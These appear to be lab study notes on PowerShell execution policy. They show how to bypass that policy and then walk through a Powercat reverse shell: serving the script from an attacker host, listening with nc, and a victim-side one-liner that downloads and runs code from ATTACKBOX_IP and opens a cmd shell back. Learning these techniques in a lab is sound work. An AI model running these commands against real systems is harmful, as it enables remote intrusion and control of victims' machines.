PowerShell is an object-oriented programming language ***executed from the Dynamic Language Runtime (DLR) in .NET***. 

#### Execution Policy
PowerShell's execution policy is a `security option` to protect the system from running malicious scripts. By default, Microsoft ***disables executing PowerShell scripts `.ps1`*** for security purposes. The PowerShell execution policy is set to `Restricted`, which means it ***permits individual commands but not run any scripts***.

**Check the Execution Policy in PowerShell**:
```
Get-ExecutionPolicy
```

**Change the Execution Policy in PowerShell**:
```
Set-ExecutionPolicy -Scope CurrentUser RemoteSigned
```

#### Bypass Execution Policy
We can change it to `bypass` policy which means that nothing is blocked or restricted.
```
powershell -ex bypass -File thm.ps1

# or
# Bypass Execution Policy for all Sessions:

powershell -ex bypass
```

#### Reverse Shell using Powercat
**Attacker Machine**
This tool is written in PowerShell:
```
git clone hxxps://github.com/besimorhino/powercat.git
```

**Setup a Web Server and Listen on Port**:
```
cd powercat
python3 -m http.server 8080
nc -nvlp 1337
```

**Victim Machine**
Download the payload and execute it using PowerShell payload:
```
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKBOX_IP:8080/powercat.ps1');powercat -c ATTACKBOX_IP -p 1337 -e cmd"
```



